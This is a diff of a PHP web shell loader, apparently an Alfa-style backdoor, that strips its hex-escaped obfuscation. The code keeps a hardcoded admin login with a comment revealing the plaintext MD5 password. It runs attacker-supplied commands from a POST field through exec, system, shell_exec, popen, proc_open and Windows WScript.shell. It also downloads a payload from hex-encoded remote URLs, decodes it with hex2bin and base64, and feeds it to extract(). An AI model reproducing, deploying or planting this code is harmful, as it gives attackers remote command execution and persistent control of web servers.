@@ -1,7 +1,7 @@
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'admin',
-    'password' => '1a1dc91c907325c69271ddf0c944bc72', // pass
+    'password' => '1a1dc91c907325c69271ddf0c944bc72', //md5(ehsan)
     'safe_mode' => '1',
     'login_page' => 'gui',
     'show_icons' => '1',
@@ -35,26 +35,27 @@ while (True) {
 }
 function _oOaA($url)
 {
-    if (function_exists("\x63\x75\x72\x6C\x5F\x65\x78\x65\x63")) {
-        $conn = curl_init(${"\x75\x72\x6C"});
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
         curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
         curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
         curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
         $url_get_contents_data = (curl_exec($conn));
         curl_close($conn);
-    } elseif (function_exists("\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73")) {
+    } elseif (function_exists('file_get_contents')) {
         $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists("\x66\x6F\x70\x65\x6E") && function_exists("\x73\x74\x72\x65\x61\x6D\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73")) {
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
         $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents(${"\x68\x61\x6E\x64\x6C\x65"});
+        $url_get_contents_data = stream_get_contents($handle);
     } else {
         $url_get_contents_data = false;
     }
     return $url_get_contents_data;
 }
 $Array = [
-    '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f72697a74726578782f68636b65722f6d61696e2f616c666167657432',
-    '697a74726578782f68636b65722f6d61696e2f616c666f2e68636b'
+    '68747470733a2f2f787365632d313333372e7765622e6170702f4046696c65732f646967696c656e73',
+    '697a74726578782f68636b65722f6d61696e2f616c666f2e68636b',
+    '6865783262696e'
 
 ];
 $hitung_array = count($Array);
@@ -95,34 +96,34 @@ function _mad_cmd($in, $re = false)
 {
     $out = "";
     try {
-        if ($re) $in = $in . "\x20\x32\x3E\x26\x31";
-        if (function_exists("\x65\x78\x65\x63")) {
+        if ($re) $in = $in . " 2>&1";
+        if (function_exists("exec")) {
             @ExEc($in, $out);
             $out = @join("\n", $out);
-        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
+        } elseif (function_exists("passthru")) {
             ob_start();
             @PasSthRu($in);
             $out = ob_get_clean();
-        } elseif (function_exists("\x73\x79\x73\x74\x65\x6D")) {
+        } elseif (function_exists("system")) {
             ob_start();
             @SySteM($in);
             $out = ob_get_clean();
-        } elseif (function_exists("\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63")) {
+        } elseif (function_exists("shell_exec")) {
             $out = sHeLL_exEc($in);
-        } elseif (function_exists("\x70\x6F\x70\x65\x6E") && function_exists("\x70\x63\x6C\x6F\x73\x65")) {
+        } elseif (function_exists("popen") && function_exists("pclose")) {
             if (is_resource($f = @pOpeN($in, "r"))) {
                 $out = "";
                 while (!@feof($f))
                     $out .= fread($f, 1024);
                 pClose($f);
             }
-        } elseif (function_exists("\x70\x72\x6F\x63\x5F\x6F\x70\x65\x6E")) {
+        } elseif (function_exists("proc_open")) {
             $pipes = array();
-            $process = @proC_opeN($in . "\x20\x32\x3E\x26\x31", array(array("\x70\x69\x70\x65", "w"), array("\x70\x69\x70\x65", "w"), array("\x70\x69\x70\x65", "w")), $pipes, null);
+            $process = @proC_opeN($in . " 2>&1", array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
             $out = @stream_Get_contEnts($pipes[1]);
-        } elseif (class_exists("\x43\x4F\x4D")) {
-            $alfaWs = new COM("\x57\x53\x63\x72\x69\x70\x74\x2E\x73\x68\x65\x6C\x6C");
-            $exec = $alfaWs->eXeC("\x63\x6D\x64\x2E\x65\x78\x65\x20\x2F\x63\x20" . $_POST['alfa1']);
+        } elseif (class_exists("COM")) {
+            $alfaWs = new COM("WScript.shell");
+            $exec = $alfaWs->eXeC("cmd.exe /c " . $_POST['alfa1']);
             $stdout = $exec->StdOut();
             $out = $stdout->ReadAll();
         }
@@ -143,8 +144,8 @@ function ____($_____)
     array_map('unlink', glob($_a . "/*.11*"));
     return get_defined_vars();
 }
+
 $data = _oOaA($fungsi[0]);
 if ($data) {
-    eXtRaCt(____($data));
-
+    eXtRaCt(____($fungsi[2](base64_decode($data))));
 }
